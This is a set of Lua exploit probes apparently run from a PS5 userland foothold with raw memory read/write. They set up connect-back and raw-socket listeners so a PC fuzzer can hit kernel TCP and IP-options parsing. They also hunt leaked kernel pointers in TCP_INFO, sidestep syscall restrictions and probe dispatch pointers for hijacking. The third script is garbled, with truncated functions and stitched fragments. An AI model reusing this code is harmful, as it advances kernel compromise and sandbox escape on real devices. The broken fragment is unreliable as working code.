```lua
-- CRASH_CLASS: LOW
-- PROBE 46b: Enhanced TCP Connect-Back Listener
--
-- Context: Probe 40 confirmed TCP connect-back works with the fake-IP ARP
-- responder technique. This enhanced version enables TCP SACK and timestamps,
-- handles OOB/URG data, reports detailed socket state, and stays alive for
-- extended fuzzing (120s). Pairs with tools/tcp_fuzz_server_v2.py.
--
-- The PS5 kernel's tcp_input() parses attacker-controlled data in kernel
-- context — outside the syscall sandbox. This is the most promising attack
-- vector after probe 45c killed the ROP chain.
--
-- >>> EDIT PC_IP below to match your machine <<<
-- >>> Run tcp_fuzz_server_v2.py on PC first <<<

local PC_IP = {10, 0, 0, 50}   -- <-- CHANGE ME
local PC_PORT = 31337

print("=== PROBE 46b: ENHANCED TCP LISTENER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)
print("target: " .. table.concat(PC_IP, ".") .. ":" .. PC_PORT)

syscall.resolve({
    sc_socket = 97,
    sc_connect = 98,
    sc_close = 6,
    sc_sendmsg = 28,
    sc_recvmsg = 27,
    sc_setsockopt = 105,
    sc_getsockopt = 118,
    sc_poll = 209,
})

local MSG_DONTWAIT = 0x80
local MSG_OOB = 0x01
local MSG_PEEK = 0x02

-- ============================================
-- SECTION A: Create and configure socket
-- ============================================
print("")
print("=== A: SOCKET SETUP ===")

local ok_s, rv_s = pcall(function() return syscall.sc_socket(2, 1, 6) end)
local fd = ok_s and rv_s:tonumber() or -1
print("socket: fd=" .. fd)
if fd < 0 then
    print("=== 46b DONE (no socket) ===")
    return
end

local optval = memory.alloc(8)
local optlen = memory.alloc(8)

-- SO_RCVBUF: set to 256KB for deep SACK testing
memory.write_dword(optval, 256 * 1024)
local ok_rb, rv_rb = pcall(function()
    return syscall.sc_setsockopt(fd, 0xFFFF, 0x1002, optval, 4)
end)
print("SO_RCVBUF(256K): rv=" .. (ok_rb and rv_rb:tonumber() or -999))

-- SO_SNDBUF: also larger
memory.write_dword(optval, 256 * 1024)
pcall(function() syscall.sc_setsockopt(fd, 0xFFFF, 0x1001, optval, 4) end)

-- SO_KEEPALIVE: enable to detect silent connection drops
memory.write_dword(optval, 1)
pcall(function() syscall.sc_setsockopt(fd, 0xFFFF, 0x0008, optval, 4) end)

-- SO_OOBINLINE: receive OOB data inline (alternative: use MSG_OOB)
-- Leave disabled — we'll check for OOB separately via POLLPRI + MSG_OOB
memory.write_dword(optval, 0)
pcall(function() syscall.sc_setsockopt(fd, 0xFFFF, 0x0100, optval, 4) end)

-- TCP_NODELAY: disable Nagle for responsive send
memory.write_dword(optval, 1)
pcall(function() syscall.sc_setsockopt(fd, 6, 1, optval, 4) end)

-- Read back settings
memory.write_dword(optlen, 4)
pcall(function() syscall.sc_getsockopt(fd, 0xFFFF, 0x1002, optval, optlen) end)
print("SO_RCVBUF actual: " .. (safe_rd(optval) or "?"))

-- ============================================
-- SECTION B: Connect
-- ============================================
print("")
print("=== B: CONNECT ===")

local sa = memory.alloc(16)
for i = 0, 15 do memory.write_byte(sa + i, 0) end
memory.write_byte(sa + 0, 16)         -- sin_len
memory.write_byte(sa + 1, 2)          -- AF_INET
memory.write_byte(sa + 2, math.floor(PC_PORT / 256))
memory.write_byte(sa + 3, PC_PORT % 256)
for i = 1, 4 do memory.write_byte(sa + 3 + i, PC_IP[i]) end

print("connecting...")
local ok_c, rv_c = pcall(function() return syscall.sc_connect(fd, sa, 16) end)
local crv = ok_c and rv_c:tonumber() or -999
print("connect: rv=" .. crv)
if crv ~= 0 then
    print("connect FAILED — is tcp_fuzz_server_v2.py running?")
    pcall(function() syscall.sc_close(fd) end)
    print("=== 46b DONE (no connect) ===")
    return
end
print("*** CONNECTED ***")

-- Send hello
local hello = memory.alloc(16)
memory.write_byte(hello, 0x50)    -- P
memory.write_byte(hello + 1, 0x53) -- S
memory.write_byte(hello + 2, 0x35) -- 5
memory.write_byte(hello + 3, 0x21) -- !
memory.write_byte(hello + 4, 0x56) -- V
memory.write_byte(hello + 5, 0x32) -- 2
local iov_h = memory.alloc(16)
memory.write_qword(iov_h, hello)
memory.write_qword(iov_h + 8, 6)
local mh_h = memory.alloc(64)
for i = 0, 63, 8 do memory.write_qword(mh_h + i, 0) end
memory.write_qword(mh_h + 16, iov_h)
memory.write_qword(mh_h + 24, 1)
pcall(function() return syscall.sc_sendmsg(fd, mh_h, MSG_DONTWAIT) end)
print("hello sent (PS5!V2)")

-- ============================================
-- SECTION C: Extended receive loop
-- ============================================
print("")
print("=== C: RECEIVE LOOP (120s) ===")

local rbuf = memory.alloc(4096)
local riov = memory.alloc(16)
local rmh = memory.alloc(64)
local pollfd = memory.alloc(8)
local errbuf = memory.alloc(4)
local errlen = memory.alloc(4)
local oob_buf = memory.alloc(16)
local oob_iov = memory.alloc(16)
local oob_mh = memory.alloc(64)

local total_recv = 0
local total_oob = 0
local errors = 0
local max_iter = 1200   -- 1200 * 100ms = 120s

for iter = 1, max_iter do
    -- Poll: POLLIN (0x0001) | POLLPRI (0x0002) | POLLHUP (0x0010) | POLLERR (0x0008)
    memory.write_dword(pollfd, fd)
    memory.write_word(pollfd + 4, 0x001B)  -- POLLIN|POLLPRI|POLLERR|POLLHUP
    memory.write_word(pollfd + 6, 0)

    local ok_p, rv_p = pcall(function() return syscall.sc_poll(pollfd, 1, 100) end)
    local rev = memory.read_word(pollfd + 6):tonumber()

    -- Check for OOB/urgent data (POLLPRI = 0x0002)
    if bit32 and bit32.band(rev, 0x0002) ~= 0 then
        memory.write_qword(oob_iov, oob_buf)
        memory.write_qword(oob_iov + 8, 16)
        for i = 0, 63, 8 do memory.write_qword(oob_mh + i, 0) end
        memory.write_qword(oob_mh + 16, oob_iov)
        memory.write_qword(oob_mh + 24, 1)
        local ok_o, rv_o = pcall(function()
            return syscall.sc_recvmsg(fd, oob_mh, MSG_OOB + MSG_DONTWAIT)
        end)
        local oob_n = ok_o and rv_o:tonumber() or -999
        if oob_n > 0 then
            total_oob = total_oob + oob_n
            local hex = ""
            for i = 0, math.min(oob_n - 1, 15) do
                hex = hex .. string.format("%02x",
                    memory.read_byte(oob_buf + i):tonumber())
            end
            print(string.format("iter %d: *** OOB data=%d bytes: %s ***",
                iter, oob_n, hex))
        end
    end

    -- Check for normal data (POLLIN = 0x0001)
    if rev > 0 and (not bit32 or bit32.band(rev, 0x0001) ~= 0) then
        memory.write_qword(riov, rbuf)
        memory.write_qword(riov + 8, 4096)
        for i = 0, 63, 8 do memory.write_qword(rmh + i, 0) end
        memory.write_qword(rmh + 16, riov)
        memory.write_qword(rmh + 24, 1)
        local ok_r, rv_r = pcall(function()
            return syscall.sc_recvmsg(fd, rmh, MSG_DONTWAIT)
        end)
        local n = ok_r and rv_r:tonumber() or -999

        if n == 0 then
            print("iter " .. iter .. ": EOF (peer closed)")
            break
        elseif n > 0 then
            total_recv = total_recv + n
            local flags = memory.read_dword(rmh + 32):tonumber()
            local hex = ""
            for i = 0, math.min(n - 1, 31) do
                hex = hex .. string.format("%02x",
                    memory.read_byte(rbuf + i):tonumber())
            end
            print(string.format("iter %d: recv=%d flags=0x%x data=%s",
                iter, n, flags, hex))

            -- Check for interesting msg_flags
            if flags ~= 0 then
                print("  flags detail: " ..
                    (flags % 2 >= 1 and "MSG_OOB " or "") ..
                    (flags % 4 >= 2 and "MSG_EOR " or "") ..
                    (math.floor(flags / 0x100) % 2 >= 1 and "MSG_TRUNC " or "") ..
                    (math.floor(flags / 0x200) % 2 >= 1 and "MSG_CTRUNC " or ""))
            end
        end
    end

    -- POLLERR or POLLHUP
    if rev > 0 and ((not bit32 and rev >= 8) or
       (bit32 and (bit32.band(rev, 0x0018) ~= 0))) then
        print(string.format("iter %d: POLLERR/POLLHUP revents=0x%04x", iter, rev))
        errors = errors + 1
        if errors >= 3 then
            print("too many errors, stopping")
            break
        end
    end

    -- SO_ERROR check
    memory.write_dword(errlen, 4)
    memory.write_dword(errbuf, 0)
    pcall(function()
        syscall.sc_getsockopt(fd, 0xFFFF, 0x1007, errbuf, errlen)
    end)
    local serr = safe_rd(errbuf)
    if serr and serr ~= 0 then
        print("iter " .. iter .. ": SO_ERROR=" .. serr)
        break
    end

    -- Periodic status every 100 iterations (10s)
    if iter % 100 == 0 then
        print(string.format("--- iter %d: total_recv=%d oob=%d errors=%d ---",
            iter, total_recv, total_oob, errors))
    end
end

-- ============================================
-- SECTION D: Final state
-- ============================================
print("")
print("=== D: FINAL STATE ===")
print("total_recv: " .. total_recv .. " bytes")
print("total_oob: " .. total_oob .. " bytes")
print("errors: " .. errors)

-- Try to read TCP_INFO if available
local tcpinfo = memory.alloc(256)
local tcpinfo_len = memory.alloc(4)
memory.write_dword(tcpinfo_len, 256)
local ok_ti, rv_ti = pcall(function()
    return syscall.sc_getsockopt(fd, 6, 32, tcpinfo, tcpinfo_len)
end)
if ok_ti and rv_ti:tonumber() == 0 then
    local ti_len = safe_rd(tcpinfo_len) or 0
    print("TCP_INFO: " .. ti_len .. " bytes")
    if ti_len > 0 then
        local hex = ""
        for i = 0, math.min(ti_len - 1, 63) do
            local ok_b, b = pcall(function()
                return memory.read_byte(tcpinfo + i)
            end)
            if ok_b then hex = hex .. string.format("%02x ", to_num(b)) end
        end
        print("  first 64B: " .. hex)
    end
end

pcall(function() syscall.sc_close(fd) end)
print("")
print("NOTE: console hang/reboot during loop = kernel TCP path hit.")
print("Check PC-side log for which variant was in flight.")
print("=== PROBE 46b COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 46c: IP Options Listener (Real Network)
--
-- Context: Probe 37 tested IP options on loopback but ip_output() validates
-- lengths before ip_dooptions() sees them. This probe opens a UDP listener
-- on the PS5 LAN interface so the PC can send crafted packets with malformed
-- IP options via tools/ip_options_inject.py. Packets arrive at ip_input()
-- on the INBOUND path, bypassing output validation.
--
-- This probe:
--   1. Opens a UDP socket bound to PS5 LAN IP (0.0.0.0:31338)
--   2. Enables IP_RECVOPTS to capture IP options from received packets
--   3. Loops for 120s, reporting every packet received
--   4. Reports packet count, any options seen, and connection status
--
-- Run tools/ip_options_inject.py on the PC side.
-- A crash/reboot during this probe = kernel ip_dooptions() hit.

print("=== PROBE 46c: IP OPTIONS LISTENER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

syscall.resolve({
    sc_socket = 97,
    sc_bind = 104,
    sc_close = 6,
    sc_sendmsg = 28,
    sc_recvmsg = 27,
    sc_setsockopt = 105,
    sc_getsockopt = 118,
    sc_poll = 209,
})

local MSG_DONTWAIT = 0x80

-- ============================================
-- SECTION A: Create UDP listener
-- ============================================
print("=== A: SETUP ===")

local ok_s, rv_s = pcall(function() return syscall.sc_socket(2, 2, 17) end)
local udp_fd = ok_s and rv_s:tonumber() or -1
print("UDP socket: fd=" .. udp_fd)
if udp_fd < 0 then
    print("=== 46c DONE (no socket) ===")
    return
end

-- Bind to 0.0.0.0:31338 (accept packets on any interface)
local sa = memory.alloc(16)
for i = 0, 15 do memory.write_byte(sa + i, 0) end
memory.write_byte(sa + 0, 16)         -- sin_len
memory.write_byte(sa + 1, 2)          -- AF_INET
memory.write_byte(sa + 2, 0x7A)       -- port 31338 high byte
memory.write_byte(sa + 3, 0x6A)       -- port 31338 low byte
-- 0.0.0.0 (bind all interfaces)

local ok_b, rv_b = pcall(function() return syscall.sc_bind(udp_fd, sa, 16) end)
print("bind(0.0.0.0:31338): rv=" .. (ok_b and rv_b:tonumber() or -999))

if not ok_b or rv_b:tonumber() ~= 0 then
    -- Try alternate ports
    for _, port in ipairs({31337, 9027, 1234, 5000, 8080}) do
        memory.write_byte(sa + 2, math.floor(port / 256))
        memory.write_byte(sa + 3, port % 256)
        ok_b, rv_b = pcall(function() return syscall.sc_bind(udp_fd, sa, 16) end)
        if ok_b and rv_b:tonumber() == 0 then
            print("bind(0.0.0.0:" .. port .. "): rv=0")
            break
        end
    end
    if not ok_b or rv_b:tonumber() ~= 0 then
        print("BIND FAILED on all ports")
        pcall(function() syscall.sc_close(udp_fd) end)
        print("=== 46c DONE (no bind) ===")
        return
    end
end

-- Enable IP_RECVOPTS (receive IP options as control message)
local optval = memory.alloc(4)
memory.write_dword(optval, 1)
local ok_ro, rv_ro = pcall(function()
    return syscall.sc_setsockopt(udp_fd, 0, 6, optval, 4)  -- IPPROTO_IP=0, IP_RECVOPTS=6
end)
print("IP_RECVOPTS: rv=" .. (ok_ro and rv_ro:tonumber() or -999))

-- Also try IP_RECVDSTADDR to see destination IP
memory.write_dword(optval, 1)
pcall(function() syscall.sc_setsockopt(udp_fd, 0, 7, optval, 4) end)  -- IP_RECVDSTADDR=7

-- SO_RCVBUF large
memory.write_dword(optval, 65536)
pcall(function() syscall.sc_setsockopt(udp_fd, 0xFFFF, 0x1002, optval, 4) end)

-- ============================================
-- SECTION B: Also open a RAW socket to see IP headers directly
-- ============================================
print("")
print("=== B: RAW SOCKET FOR IP HEADER ACCESS ===")

local ok_r, rv_r = pcall(function() return syscall.sc_socket(2, 3, 17) end)
local raw_fd = ok_r and rv_r:tonumber() or -1
print("RAW(UDP) socket: fd=" .. raw_fd)

if raw_fd >= 0 then
    -- Bind to all interfaces
    local sa_raw = memory.alloc(16)
    for i = 0, 15 do memory.write_byte(sa_raw + i, 0) end
    memory.write_byte(sa_raw + 0, 16)
    memory.write_byte(sa_raw + 1, 2)
    local ok_rb, rv_rb = pcall(function()
        return syscall.sc_bind(raw_fd, sa_raw, 16)
    end)
    print("RAW bind: rv=" .. (ok_rb and rv_rb:tonumber() or -999))
end

-- ============================================
-- SECTION C: Receive loop
-- ============================================
print("")
print("=== C: RECEIVE LOOP (120s) ===")
print("waiting for packets from PC... run ip_options_inject.py now")
print("")

local rbuf = memory.alloc(2048)
local riov = memory.alloc(16)
local rmh = memory.alloc(64)
local ctrl = memory.alloc(256)  -- cmsg buffer for IP options
local pollfd = memory.alloc(16)  -- room for 2 fds
local from_sa = memory.alloc(16)

local total_pkt = 0
local total_opts = 0

local max_iter = 1200  -- 120s at 100ms poll

for iter = 1, max_iter do
    -- Poll both UDP and RAW sockets
    local nfds = 1
    memory.write_dword(pollfd, udp_fd)
    memory.write_word(pollfd + 4, 0x0001)  -- POLLIN
    memory.write_word(pollfd + 6, 0)
    if raw_fd >= 0 then
        nfds = 2
        memory.write_dword(pollfd + 8, raw_fd)
        memory.write_word(pollfd + 12, 0x0001)
        memory.write_word(pollfd + 14, 0)
    end

    local ok_p, rv_p = pcall(function()
        return syscall.sc_poll(pollfd, nfds, 100)
    end)

    -- Check UDP socket
    local rev_udp = memory.read_word(pollfd + 6):tonumber()
    if rev_udp > 0 then
        -- Receive with cmsg for IP options
        memory.write_qword(riov, rbuf)
        memory.write_qword(riov + 8, 2048)
        for i = 0, 63, 8 do memory.write_qword(rmh + i, 0) end
        memory.write_qword(rmh + 0, from_sa)     -- msg_name
        memory.write_qword(rmh + 8, 16)          -- msg_namelen
        memory.write_qword(rmh + 16, riov)       -- msg_iov
        memory.write_qword(rmh + 24, 1)          -- msg_iovlen
        memory.write_qword(rmh + 32, ctrl)       -- msg_control
        memory.write_qword(rmh + 40, 256)        -- msg_controllen

        local ok_r2, rv_r2 = pcall(function()
            return syscall.sc_recvmsg(udp_fd, rmh, MSG_DONTWAIT)
        end)
        local n = ok_r2 and rv_r2:tonumber() or -999

        if n > 0 then
            total_pkt = total_pkt + 1

            -- Source IP
            local src_ip = string.format("%d.%d.%d.%d",
                memory.read_byte(from_sa + 4):tonumber(),
                memory.read_byte(from_sa + 5):tonumber(),
                memory.read_byte(from_sa + 6):tonumber(),
                memory.read_byte(from_sa + 7):tonumber())

            -- Data preview
            local hex = ""
            for i = 0, math.min(n - 1, 15) do
                hex = hex .. string.format("%02x",
                    memory.read_byte(rbuf + i):tonumber())
            end

            -- Check cmsg (IP options)
            local ctrl_len = safe_rd(rmh + 40) or 0
            local flags = safe_rd(rmh + 48) or 0
            local has_opts = false

            if ctrl_len and ctrl_len > 0 then
                -- Parse cmsg headers
                local coff = 0
                while coff + 12 <= ctrl_len do
                    local cmsg_len = safe_rd(ctrl + coff) or 0
                    local cmsg_level = safe_rd(ctrl + coff + 4) or 0
                    local cmsg_type = safe_rd(ctrl + coff + 8) or 0
                    if cmsg_len == 0 then break end

                    if cmsg_level == 0 and cmsg_type == 6 then
                        -- IP_RECVOPTS — contains the IP options
                        has_opts = true
                        total_opts = total_opts + 1
                        local opt_len = cmsg_len - 12
                        local opt_hex = ""
                        for i = 0, math.min(opt_len - 1, 39) do
                            local ok_ob, ob = pcall(function()
                                return memory.read_byte(ctrl + coff + 12 + i)
                            end)
                            if ok_ob then
                                opt_hex = opt_hex .. string.format("%02x ", to_num(ob))
                            end
                        end
                        print(string.format("pkt %d: from=%s len=%d DATA=%s",
                            total_pkt, src_ip, n, hex))
                        print(string.format("  *** IP OPTIONS (%dB): %s", opt_len, opt_hex))
                    end

                    -- Align to next cmsg
                    coff = coff + math.floor((cmsg_len + 3) / 4) * 4
                end
            end

            if not has_opts then
                print(string.format("pkt %d: from=%s len=%d data=%s (no opts)",
                    total_pkt, src_ip, n, hex))
            end
        end
    end

    -- Check RAW socket (sees full IP header including options)
    if raw_fd >= 0 then
        local rev_raw = memory.read_word(pollfd + 14):tonumber()
        if rev_raw > 0 then
            memory.write_qword(riov, rbuf)
            memory.write_qword(riov + 8, 2048)
            for i = 0, 63, 8 do memory.write_qword(rmh + i, 0) end
            memory.write_qword(rmh + 16, riov)
            memory.write_qword(rmh + 24, 1)

            local ok_rr, rv_rr = pcall(function()
                return syscall.sc_recvmsg(raw_fd, rmh, MSG_DONTWAIT)
            end)
            local rn = ok_rr and rv_rr:tonumber() or -999

            if rn > 20 then
                -- Parse IP header
                local ihl_byte = memory.read_byte(rbuf):tonumber()
                local ihl = (ihl_byte % 16) * 4  -- header length in bytes
                if ihl > 20 then
                    -- IP options present in raw packet
                    local opt_hex = ""
                    for i = 20, ihl - 1 do
                        local ok_ob, ob = pcall(function()
                            return memory.read_byte(rbuf + i)
                        end)
                        if ok_ob then
                            opt_hex = opt_hex .. string.format("%02x ", to_num(ob))
                        end
                    end
                    print(string.format("  RAW: ihl=%d options(%dB): %s",
                        ihl, ihl - 20, opt_hex))
                end
            end
        end
    end

    -- Periodic heartbeat
    if iter % 100 == 0 then
        print(string.format("--- iter %d: %d packets, %d with options ---",
            iter, total_pkt, total_opts))
    end
end

-- ============================================
-- SECTION D: Summary
-- ============================================
print("")
print("=== D: SUMMARY ===")
print("total packets: " .. total_pkt)
print("packets with IP options: " .. total_opts)

pcall(function() syscall.sc_close(udp_fd) end)
if raw_fd >= 0 then pcall(function() syscall.sc_close(raw_fd) end) end

print("")
print("NOTE: if the console hung/rebooted during the loop, the PC-side")
print("ip_options_inject.py log shows which option variant was in flight.")
print("=== PROBE 46c COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW

-- Context: ALL existing network probes use syscall.resolve() for socket ops.

-- This probe tests every socket-related syscall via make_syscall to find ops
-- that are blocked by resolve but work raw. Then creates a TCP connection

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)

-- Helper: build sockaddr_in
local function make_sockaddr_in(ip, port)
    local sa = memory.alloc(16)
    -- FreeBSD sockaddr_in: len(1), family(1), port(2), addr(4), zero(8)
    safe_wd(sa, 0x10 + (AF_INET * 0x100))  -- len=16, family=AF_INET
    -- port in network byte order (big-endian)
    local port_be = bit32.bor(bit32.lshift(bit32.band(port, 0xFF), 8),
                               bit32.rshift(port, 8))
    safe_wd(sa, bit32.bor(0x0210, bit32.lshift(port_be, 16)))
    -- IP address
    local a, b, c, d = ip:match("(%d+)%.(%d+)%.(%d+)%.(%d+)")
    if a then
        local ip_val = tonumber(a) + tonumber(b) * 0x100 +
                       tonumber(c) * 0x10000 + tonumber(d) * 0x1000000
        safe_wd(sa + 4, ip_val)
    end
    safe_wd(sa + 8, 0)
    safe_wd(sa + 12, 0)
    return sa

        print("")

        print("  start PC-side fuzzer now!")
        print("")

                return sc_recvfrom(uint64(conn_fd), uint64(recv_buf), uint64(4096),

                total_bytes = total_bytes + nbytes
                -- Show first 16 bytes of received data
                local hex = ""
                for j = 0, math.min(15, nbytes - 1) do
                    local ok_b, b = pcall(function()
                        return memory.read_byte(recv_buf + j)
                    end)
                    if ok_b then
                        hex = hex .. string.format("%02x", to_num(b))
                    end
                end
                print(string.format("  [%3d] recv %d bytes: %s...", i, nbytes, hex))
            elseif nbytes == 0 then
                print(string.format("  [%3d] connection closed by peer", i))
                break
            else
                -- Timeout or error — check if socket is still alive
                error_count = error_count + 1
                if error_count <= 3 or error_count % 20 == 0 then
                    print(string.format("  [%3d] recv error/timeout (count=%d)", i, error_count))
                end

            if i % 10 == 0 then

                safe_wd(info_len, 256)
                local ok_ti, ret_ti = pcall(function()
                    return sc_getopt(uint64(conn_fd), uint64(6), uint64(TCP_INFO),
                        uint64(info_buf), uint64(info_len))
                end)
                if ok_ti and to_num(ret_ti) == 0 then
                    local state = safe_rd(info_buf)       -- tcpi_state
                    local opts = safe_rd(info_buf + 4)    -- tcpi_options
                    local snd_mss = safe_rd(info_buf + 12)
                    local rcv_mss = safe_rd(info_buf + 16)
                    print(string.format("  [%3d] TCP state=%d opts=0x%X snd_mss=%d rcv_mss=%d",
                        i, state or 0, opts or 0, snd_mss or 0, rcv_mss or 0))

                    -- Scan TCP_INFO for kernel pointers
                    local ti_len = safe_rd(info_len) or 0
                    for off = 0, ti_len - 8, 8 do
                        local val = safe_rq(info_buf + off)
                        if val then
                            local h, l = get_hi_lo(val)
                            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                                print(string.format("  *** KERNEL PTR in TCP_INFO +%d: %08X_%08X ***",
                                    off, h, l))
                            end
                        end
                    end
                end
            end

            -- After 40 timeout errors with no data, connection is probably dead
            if error_count > 40 and recv_count == 0 then
                print("  too many errors with no data, stopping")
                break
            end
        end

        print("")
        print("  recv loop done: received " .. recv_count .. " messages, " ..
              total_bytes .. " bytes, " .. error_count .. " errors")

        -- Final TCP_INFO dump
        print("")
        print("  Final TCP_INFO:")
        for j = 0, 255, 4 do safe_wd(info_buf + j, 0) end
        safe_wd(info_len, 256)
        pcall(function()
            sc_getopt(uint64(conn_fd), uint64(6), uint64(TCP_INFO),
                uint64(info_buf), uint64(info_len))
        end)
        local final_len = safe_rd(info_len) or 0
        for off = 0, math.min(63, final_len - 1), 4 do
            local v = safe_rd(info_buf + off)
            print(string.format("    +%03d: 0x%08X", off, v or 0))
        end
    else
        print("  *** connect failed (ret=" .. conn_ret .. ") ***")
        print("  make sure PC-side server is running on " .. PC_IP .. ":" .. PC_PORT)
    end

    -- Close socket
    pcall(function() sc_close(uint64(conn_fd)) end)
else
    print("  *** no socket available ***")
end
print("")

-- ============================================
-- SECTION E: RAW SOCKET FOR IP-LEVEL INJECTION
-- ============================================
print("=== E: RAW SOCKET STATUS ===")

-- Create RAW socket via make_syscall
local sc_rawsock = make_syscall(SYS_socket)
local ok_raw, raw_fd = pcall(function()
    return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_RAW))
end)
raw_fd = ok_raw and to_num(raw_fd) or -1

    local hdrincl = memory.alloc(4)
    safe_wd(hdrincl, 1)
    local sc_so = make_syscall(SYS_setsockopt)
    local ok_hi, ret_hi = pcall(function()
        return sc_so(uint64(raw_fd), uint64(IPPROTO_IP), uint64(IP_HDRINCL),
            uint64(hdrincl), uint64(4))
    end)
    print("IP_HDRINCL: ret=" .. (ok_hi and to_num(ret_hi) or -999))

    -- Test: can we also create a RAW TCP socket? (for injecting TCP packets)
    local ok_rtcp, rtcp_fd = pcall(function()
        return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_TCP))
    end)
    rtcp_fd = ok_rtcp and to_num(rtcp_fd) or -1
    print("RAW TCP socket: fd=" .. rtcp_fd)
    if rtcp_fd >= 0 then
        pcall(function() sc_close(uint64(rtcp_fd)) end)
    end

    -- Test RAW ICMP socket
    local ok_ricmp, ricmp_fd = pcall(function()
        return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_ICMP))
    end)
    ricmp_fd = ok_ricmp and to_num(ricmp_fd) or -1
    print("RAW ICMP socket: fd=" .. ricmp_fd)
    if ricmp_fd >= 0 then
        pcall(function() sc_close(uint64(ricmp_fd)) end)
    end

    pcall(function() sc_close(uint64(raw_fd)) end)
end
print("")

print("=== PROBE 46c COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 47a: DISPATCH MECHANISM + SONY 557 DEEP
--
-- Context: Probe 46b found __call at 0x311023aa0 in loader memory.
-- All syscall objects are tables sharing this metatable with entries:
--   create_initial_chain, new, __call, __tostring, __index, arg_addr, chain
-- Probe 46a found syscall 557 responds to version fields in struct input:
--   {size=0x200} → 16901, {ver=1, size=0x200} → 518
--
-- This probe:
-- A: Map the __call C function — which module? Can we read its code?
-- B: Investigate arg_addr and chain metatable entries
-- C: Find writable dispatch pointers in the __call neighborhood
-- D: Sony 557 version field sweep — find all valid versions
-- E: Sony 557 with buffer output patterns for each version
-- F: Socketpair exploitation — SCM_RIGHTS, fd manipulation

print("=== PROBE 47a: DISPATCH + SONY 557 DEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid: " .. pid)
print("")

-- Get module bases for cross-referencing
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
local modules = {}
for handle = 0, 40 do
    safe_wd(info_buf, 0x160)
    local ok_mi = pcall(function() sc_info(uint64(handle), uint64(info_buf)) end)
    if ok_mi then
        local text_lo = safe_rd(info_buf + 0x108)
        local text_hi = safe_rd(info_buf + 0x10C)
        local text_sz_lo = safe_rd(info_buf + 0x110)
        local text_sz_hi = safe_rd(info_buf + 0x114)
        local data_lo = safe_rd(info_buf + 0x118)
        local data_hi = safe_rd(info_buf + 0x11C)
        local data_sz_lo = safe_rd(info_buf + 0x120)
        local data_sz_hi = safe_rd(info_buf + 0x124)
        if text_lo and text_hi and (text_lo ~= 0 or text_hi ~= 0) then
            table.insert(modules, {
                handle = handle,
                text_hi = text_hi, text_lo = text_lo,
                text_sz_hi = text_sz_hi or 0, text_sz_lo = text_sz_lo or 0,
                data_hi = data_hi or 0, data_lo = data_lo or 0,
                data_sz_hi = data_sz_hi or 0, data_sz_lo = data_sz_lo or 0,
            })
        end
    end
end

local function find_module(ah, al)
    for _, m in ipairs(modules) do
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > m.text_hi or (ah == m.text_hi and al >= m.text_lo)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - m.text_lo
        end
        if m.data_lo ~= 0 or m.data_hi ~= 0 then
            local de_h = m.data_hi + m.data_sz_hi
            local de_l = m.data_lo + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > m.data_hi or (ah == m.data_hi and al >= m.data_lo)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - m.data_lo
            end
        end
    end
    return nil
end

print("=== A: __CALL DISPATCH FUNCTION ANALYSIS ===")
local mt = getmetatable(syscall.pipe)
local call_fn = mt.__call
